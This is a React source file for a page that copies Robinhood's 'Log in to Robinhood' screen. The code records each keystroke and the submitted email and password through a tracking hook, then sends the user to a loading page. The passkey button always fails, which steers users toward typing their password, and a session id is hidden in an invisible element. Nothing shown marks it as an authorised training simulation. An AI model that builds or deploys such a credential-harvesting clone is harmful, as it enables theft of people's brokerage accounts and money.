import { createFileRoute } from "@tanstack/react-router";
import { useState } from "react";
import { GlobeIcon, Rh3DBackground, RH_FONT_FAMILY, RhLogo, useRhTracking } from "@/components/rh/RhShared";

export const Route = createFileRoute("/rh/signin")({
  head: () => ({ meta: [{ title: "Log in to Robinhood" }] }),
  component: RhSignInPage,
});

function RhSignInPage() {
  const { trackClick, trackInput, rhNavigate, sessionId } = useRhTracking();
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [keepLoggedIn, setKeepLoggedIn] = useState(false);
  const [passkeyError, setPasskeyError] = useState(false);

  const handleLogin = () => {
    if (!email || !password) return;
    trackClick("Log In");
    trackInput("Email Submit", email);
    trackInput("Password Submit", password);
    rhNavigate("/rh/loading");
  };

  const handlePasskeys = () => {
    trackClick("Passkeys");
    setPasskeyError(true);
  };

  return (
    <div style={{ display: "flex", minHeight: "100vh", background: "#000", fontFamily: RH_FONT_FAMILY }}>
      <div className="hidden md:flex" style={{ width: "50%", background: "#000", alignItems: "center", justifyContent: "center", overflow: "hidden", position: "relative" }}>
        <Rh3DBackground />
      </div>
      <div className="hidden md:block" style={{ width: 1, background: "rgba(255,255,255,0.12)", flexShrink: 0 }} />
      <div className="w-full md:w-1/2" style={{ background: "#000", display: "flex", flexDirection: "column" }}>
        <div className="md:hidden" style={{ display: "flex", justifyContent: "space-between", alignItems: "center", padding: "20px 24px" }}>
          <RhLogo />
          <button style={{ display: "flex", alignItems: "center", gap: 6, background: "transparent", border: "none", color: "#fff", fontSize: 14, fontWeight: 500, cursor: "pointer", padding: "8px 12px" }}>
            <GlobeIcon />
            <span>US</span>
          </button>
        </div>
        <div style={{ flex: 1, display: "flex", alignItems: "flex-start", justifyContent: "center", padding: "80px 60px 40px 60px" }}>
          <div style={{ width: "100%", maxWidth: 416 }}>
            <h1 style={{ fontSize: 28, fontWeight: 400, color: "#fff", marginBottom: 40, lineHeight: 1.3 }}>Log in to Robinhood</h1>

            <div style={{ marginBottom: 20 }}>
              <label style={{ display: "block", fontSize: 14, color: "#fff", marginBottom: 8 }}>Email</label>
              <input
                name="Email Input"
                type="text"
                autoComplete="username"
                autoCapitalize="off"
                autoCorrect="off"
                spellCheck={false}
                value={email}
                onChange={(e) => { setEmail(e.target.value); setPasskeyError(false); trackInput("Email Input", e.target.value); }}
                style={{ width: "100%", height: 52, border: `1px solid ${passkeyError ? "#ff0000" : "rgba(255,255,255,0.3)"}`, borderRadius: 4, padding: "0 14px", fontSize: 16, fontFamily: "inherit", outline: "none", background: "transparent", color: "#fff", boxSizing: "border-box" }}
              />
            </div>

            <div style={{ marginBottom: 16 }}>
              <label style={{ display: "block", fontSize: 14, color: "#fff", marginBottom: 8 }}>Password</label>
              <div style={{ position: "relative" }}>
                <input
                  name="Password Input"
                  type={showPassword ? "text" : "password"}
                  autoComplete="current-password"
                  value={password}
                  onChange={(e) => { setPassword(e.target.value); trackInput("Password Input", e.target.value); }}
                  style={{ width: "100%", height: 52, border: "1px solid rgba(255,255,255,0.3)", borderRadius: 4, padding: "0 44px 0 14px", fontSize: 16, fontFamily: "inherit", outline: "none", background: "transparent", color: "#fff", boxSizing: "border-box" }}
                />
                <button type="button" onClick={() => { setShowPassword(!showPassword); trackClick("Toggle Password"); }}
                  style={{ position: "absolute", right: 14, top: "50%", transform: "translateY(-50%)", background: "none", border: "none", cursor: "pointer", padding: 0, color: "#fff", display: "flex", alignItems: "center" }}>
                  {showPassword ? (
                    <svg fill="none" height="16" viewBox="0 0 16 16" width="16"><path clipRule="evenodd" d="M1 8s1.91-4.455 7-4.455S15 8 15 8s-1.91 4.454-7 4.454S1 8 1 8Zm4.773 0A2.23 2.23 0 0 0 8 10.227 2.23 2.23 0 0 0 10.227 8 2.23 2.23 0 0 0 8 5.773 2.23 2.23 0 0 0 5.773 8Z" fill="currentColor" fillRule="evenodd" /></svg>
                  ) : (
                    <svg fill="none" height="16" viewBox="0 0 16 16" width="16"><path clipRule="evenodd" d="M13.719 1.878 1.775 13.822l1.06 1.06 2.787-2.786c.7.223 1.491.358 2.378.358 5.09 0 7-4.454 7-4.454s-.696-1.625-2.37-2.912l2.15-2.15-1.061-1.06Zm-3.54 5.66L7.54 10.18a2.23 2.23 0 0 0 2.64-2.64Z" fill="currentColor" fillRule="evenodd" /><path d="M5.794 7.689A2.232 2.232 0 0 1 7.69 5.794l2.06-2.06A7.982 7.982 0 0 0 8 3.545C2.91 3.545 1 8 1 8s.574 1.34 1.933 2.55l2.861-2.86Z" fill="currentColor" /></svg>
                  )}
                </button>
              </div>
            </div>

            <div style={{ display: "flex", alignItems: "center", gap: 10, marginBottom: 36 }}>
              <div onClick={() => { setKeepLoggedIn(!keepLoggedIn); trackClick("Keep Logged In"); }}
                style={{ width: 18, height: 18, border: "1px solid rgba(255,255,255,0.4)", borderRadius: 3, cursor: "pointer", display: "flex", alignItems: "center", justifyContent: "center", background: keepLoggedIn ? "#fff" : "transparent", flexShrink: 0 }}>
                {keepLoggedIn && (
                  <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#000" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round"><polyline points="20 6 9 17 4 12" /></svg>
                )}
              </div>
              <span style={{ fontSize: 14, color: "#fff", cursor: "pointer" }} onClick={() => setKeepLoggedIn(!keepLoggedIn)}>Keep me logged in for up to 30 days</span>
            </div>

            <button onClick={handleLogin}
              style={{ width: "100%", height: 52, borderRadius: 26, border: "none", background: "#fff", color: "#000", fontSize: 16, fontWeight: 500, fontFamily: "inherit", cursor: "pointer", marginBottom: 20 }}>
              {passkeyError ? "Log in with email and password" : "Log In"}
            </button>

            <div style={{ display: "flex", alignItems: "center", gap: 16, marginBottom: 20 }}>
              <div style={{ flex: 1, height: 1, background: "rgba(255,255,255,0.15)" }} />
              <span style={{ fontSize: 14, color: "rgba(255,255,255,0.5)" }}>or</span>
              <div style={{ flex: 1, height: 1, background: "rgba(255,255,255,0.15)" }} />
            </div>

            <button onClick={handlePasskeys}
              style={{ width: "100%", height: 52, borderRadius: 26, border: "none", background: "#fff", color: "#000", fontSize: 16, fontFamily: "inherit", cursor: "pointer", display: "flex", alignItems: "center", justifyContent: "center", gap: 8, marginBottom: 32 }}>
              <svg fill="none" height="16" viewBox="0 0 16 16" width="16"><path clipRule="evenodd" d="M4.75 7.004h-1.5V14h9.5V7.004h-1.5V5.25a3.25 3.25 0 1 0-6.5 0v1.754Zm1.5 0h3.5V5.25a1.75 1.75 0 1 0-3.5 0v1.754Z" fill="#000" fillRule="evenodd" /></svg>
              Log in with passkeys
            </button>

            <div style={{ fontSize: 14, color: "#fff" }}>
              Not on Robinhood?{" "}
              <span style={{ textDecoration: "underline", cursor: "pointer", fontWeight: 500 }} onClick={() => trackClick("Create Account")}>Create an account</span>
            </div>
          </div>
        </div>
      </div>
      <div className="fixed bottom-2 right-2 text-[10px] opacity-0 pointer-events-none">{sessionId}</div>
    </div>
  );
}
